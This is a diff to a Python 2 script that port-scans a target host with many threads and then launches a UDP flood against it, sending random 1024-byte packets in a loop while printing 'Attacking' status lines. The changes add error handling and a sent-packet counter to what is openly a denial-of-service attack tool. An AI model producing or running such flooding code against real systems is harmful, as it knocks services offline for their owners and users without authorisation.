@@ -94,21 +94,29 @@ class pyScan:
         self.scan(self.host, self.start, self.stop)
 
     def scan(self, host, start, stop):
-        t1 = datetime.now()
-        self.port = start
-        while self.port <= stop:
-            while threading.activeCount() < MAX_THREADS:
-                Scanner(host, self.port).start()
-                self.port += 1
-                if self.port == self.stop:
-                    time.sleep(5)
+        try:
+            t1 = datetime.now()
+            self.port = start
+            while self.port <= self.stop:
+                while threading.activeCount() < MAX_THREADS:
+                    Scanner(host, self.port).start()
+                    self.port += 1
                     t2 = datetime.now()
-                    total = t2 - t1
-                    print split
-                    print "\n"
-                    print 'Scan Complete in: ',(total)
-                    print "\n"
-                    Flood()
+                    if self.port == self.stop:
+                        time.sleep(5)
+                        total = t2 - t1
+                        print split
+                        print "\n"
+                        print 'Scan Complete in: ',(total)
+                        print "\n"
+                        Flood()                  
+
+        except KeyboardInterrupt:
+            print "Exiting..."
+        except Exception:
+            traceback.print_exc(file=sys.stdout)
+        sys.exit(1)
+
                     
 def Flood():
     try:
@@ -128,14 +136,13 @@ def Flood():
         subprocess.call('clear', shell=True)
         print "\n"
         print "Sending Data..."
-        print split
-
+        print split  
         for i in range(length):
             bytes = random._urandom(1024)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
-            sock.setsockopt(socket.SOL_SOCKET,socket.SO_SNDBUF, 1024)
             sock.sendto(bytes, (host, PORT))
             time.sleep(0.01)
+	    SENT=SENT+1
             print "(Attacking: %s) (Sent %s Packets) (Destination Port: %s)"%(host, SENT, PORT)
         sys.exit(0)   
            
@@ -149,5 +156,10 @@ def Flood():
 
 
 if __name__ == '__main__':
-  pyScan(sys.argv)
-  				
+  try:
+    pyScan(sys.argv)
+  except KeyboardInterrupt:
+    print "Exiting..."
+  except Exception:
+    traceback.print_exc(file=sys.stdout)
+  sys.exit(1)
